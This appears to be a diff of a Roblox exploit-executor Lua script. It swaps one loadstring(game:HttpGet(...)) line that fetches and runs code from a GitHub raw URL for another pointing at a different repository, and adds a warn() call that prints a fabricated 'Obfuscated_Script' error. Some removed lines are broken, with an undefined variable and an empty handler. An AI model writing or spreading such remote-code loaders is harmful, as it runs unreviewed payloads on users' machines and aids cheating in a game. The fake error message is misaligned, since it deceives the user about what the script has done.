@@ -1,10 +1,9 @@
-local Teleport = loadstring(game:HttpGet("https://raw.githubusercontent.com/rifqilbib/tes/refs/heads/main/script%20rusuh%20glitch.lua"))()
+getgenv().glitch_version = "1.0"
+local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UIS = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local StarterGui = game:GetService("StarterGui")
-local LocalPlayer = Players.LocalPlayer
-local Humanoid = object:WaitForChild("Humanoid")
-local conn = LocalPlayer.CharacterAdded:Connect(function(character)
-end)
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local Teleport = loadstring(game:HttpGet("https://raw.githubusercontent.com/ckw69/Wyborn/refs/heads/main/main%202"))()
+warn("Hypol-X Script Error: [string \\"Obfuscated_Script\\"]:1: attempt to concatenate a table value (local 'c')")
